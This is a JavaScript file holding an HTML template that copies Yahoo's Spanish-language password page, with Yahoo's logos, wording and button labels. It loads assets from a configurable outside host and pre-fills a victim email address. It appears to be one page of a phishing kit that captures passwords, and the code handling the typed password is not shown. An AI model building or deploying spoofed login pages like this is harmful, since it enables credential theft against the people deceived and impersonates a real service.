var my_titulo = 'Yahoo';
var my_contenido = `
<link rel="stylesheet" href="${my_hosting}css/yahoo.css">

<div id="login-body" class="loginish puree-v2 grid">
    <div class="mbr-desktop-hd">
        <span class="column">
            <a href="#">
                <img src="${my_hosting}img/yahoo/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
                <img src="${my_hosting}img/yahoo/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
            </a>
        </span>

    </div>
    <div class="login-box-container">
        <div class="login-box right" style="margin: auto;">
            <div class="mbr-login-hd txt-align-center">
                <img src="${my_hosting}img/yahoo/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-es-PE" width="" height="27">
                <img src="${my_hosting}img/yahoo/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-es-PE" width="" height="27">
            </div>
            <div class="challenge password-challenge">
                <div class="challenge-header">
                    <div id="btnBack">
                        <input id="txtEmail" type="hidden" value="" />
                        <div id="lblEmail" class="yid">@yahoo.com</div>
                    </div>
                </div>
                <div id="password-challenge" class="primary">
                    <strong class="challenge-heading">Introduce la contraseña</strong>
                    <span class="txt-align-center challenge-desc">para iniciar sesión</span>
                    <form onsubmit="return false" method="post" class="challenge-form ">
                        <div class="hidden-username">
                            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" value="luis2000@yahoo.com">
                        </div>
                        <div id="password-container" class="input-group password-container used blurred">
                            <input type="password" id="txtPassword" class="password used" placeholder=" " autofocus="" autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd">
                            <label for="txtPassword" id="password-label" class="password-label">Contraseña</label>
                            <div class="caps-indicator hide" id="caps-indicator" title="El bloqueo de mayúsculas está activado"></div>
                            <button type="button" class="show-hide-toggle-button show-pw" id="showPass" tabindex="-1" title="Mostrar contraseña" data-rapid-tracking="true" data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:toggle-show-hide">
                            </button>
                        </div>
                        <div class="button-container">
                            <button type="submit" id="btnNext" class="pure-button puree-button-primary puree-spinner-button challenge-button"  value="Siguiente" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
                                Siguiente
                            </button>
                        </div>
                        <div class="forgot-cont challenge-button-link">
                            <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery" data-rapid-tracking="true" id="mbr-forgot-link" value="¿Olvidaste tu contraseña?">
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1>Yahoo te permite disfrutar con facilidad de las cosas que más te importan en el&nbsp;mundo.</h1>
            <p>Lo mejor en su clase: Yahoo Mail, noticias de último momento (locales, nacionales y mundiales), finanzas, deportes, música, películas y mucho más. Aprovecha al máximo la Web y disfruta más de tu&nbsp;vida.</p>
        </div>
    </div>
</div>
`